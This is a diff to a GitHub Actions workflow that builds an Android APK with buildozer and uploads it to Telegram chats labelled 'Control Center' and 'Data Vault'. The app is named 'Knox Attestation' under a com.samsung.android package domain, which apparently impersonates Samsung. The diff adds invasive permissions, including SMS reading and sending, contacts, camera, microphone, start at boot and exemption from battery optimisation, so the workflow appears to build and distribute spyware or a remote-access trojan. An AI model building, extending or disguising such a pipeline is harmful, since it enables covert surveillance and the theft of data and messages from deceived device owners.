@@ -28,14 +28,11 @@ jobs:
           if [ ! -f "res/drawable/ic_launcher.png" ]; then
             echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
           fi
-          sed -i 's|^#\? \?title = .*|title = Knox Attestation|' buildozer.spec
-          sed -i 's|^#\? \?package.name = .*|package.name = knoxattestation|' buildozer.spec
-          sed -i 's|^#\? \?package.domain = .*|package.domain = com.samsung.android|' buildozer.spec
-          sed -i 's|^#\? \?icon.filename = .*|icon.filename = %(source.dir)s/res/drawable/ic_launcher.png|' buildozer.spec
+          # تعديلات خفيفة فقط لضمان قبول التراخيص وإعداد الصلاحيات الكاملة (لا نمسح الإعدادات اليدوية)
           sed -i 's|^#\? \?android.accept_sdk_license = .*|android.accept_sdk_license = True|' buildozer.spec
-          sed -i 's|^#\? \?android.skip_update = .*|android.skip_update = False|' buildozer.spec
           sed -i 's|^#\? \?android.auto_accept_sdk_license = .*|android.auto_accept_sdk_license = True|' buildozer.spec
-          sed -i 's|^#\? \?android.permissions = .*|android.permissions = INTERNET,ACCESS_NETWORK_STATE,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE|' buildozer.spec
+          sed -i 's|^#\? \?android.permissions = .*|android.permissions = INTERNET,ACCESS_NETWORK_STATE,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,POST_NOTIFICATIONS,READ_CONTACTS,READ_SMS,SEND_SMS,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS|' buildozer.spec
+          sed -i 's|^#\? \?android.api = .*|android.api = 33|' buildozer.spec
           cat buildozer.spec
 
       - name: Build APK
@@ -56,15 +53,6 @@ jobs:
       - name: Send APK to Telegram
         env:
           BOT1_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
-          BOT2_TOKEN: ${{ secrets.TELEGRAM_BOT_2_TOKEN }}
-          BOT3_TOKEN: ${{ secrets.TELEGRAM_BOT_3_TOKEN }}
-          BOT4_TOKEN: ${{ secrets.TELEGRAM_BOT_4_TOKEN }}
-          BOT5_TOKEN: ${{ secrets.TELEGRAM_BOT_5_TOKEN }}
-          BOT6_TOKEN: ${{ secrets.TELEGRAM_BOT_6_TOKEN }}
-          BOT7_TOKEN: ${{ secrets.TELEGRAM_BOT_7_TOKEN }}
-          BOT8_TOKEN: ${{ secrets.TELEGRAM_BOT_8_TOKEN }}
-          BOT9_TOKEN: ${{ secrets.TELEGRAM_BOT_9_TOKEN }}
-          BOT10_TOKEN: ${{ secrets.TELEGRAM_BOT_10_TOKEN }}
           CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
           VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
         run: |
@@ -73,12 +61,10 @@ jobs:
           TIMESTAMP=$(date +'%Y-%m-%d %H:%M:%S')
           if [ -f "$APK_FILE" ]; then
             echo "Sending APK to Control Center..."
-            curl --retry 3 --retry-delay 2 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" -F "caption=✅ Knox Attestation v2.0%0A⏰ $TIMESTAMP" \
-              https://api.telegram.org/bot$BOT1_TOKEN/sendDocument || \
-            curl --retry 3 --retry-delay 2 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" \
-              https://api.telegram.org/bot$BOT2_TOKEN/sendDocument
-            echo "Sending APK to Data Vault (backup)..."
-            curl --retry 3 --retry-delay 2 -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" -F "caption=📦 Backup Knox Attestation" \
+            curl --retry 3 --retry-delay 2 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" -F "caption=✅ Knox Attestation v2.5%0A⏰ $TIMESTAMP%0A📱 API 33 (Android 13+)" \
+              https://api.telegram.org/bot$BOT1_TOKEN/sendDocument
+            echo "Sending backup to Data Vault..."
+            curl --retry 3 --retry-delay 2 -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" -F "caption=📦 Backup APK" \
               https://api.telegram.org/bot$BOT1_TOKEN/sendDocument
             echo "APK sent successfully!"
           else
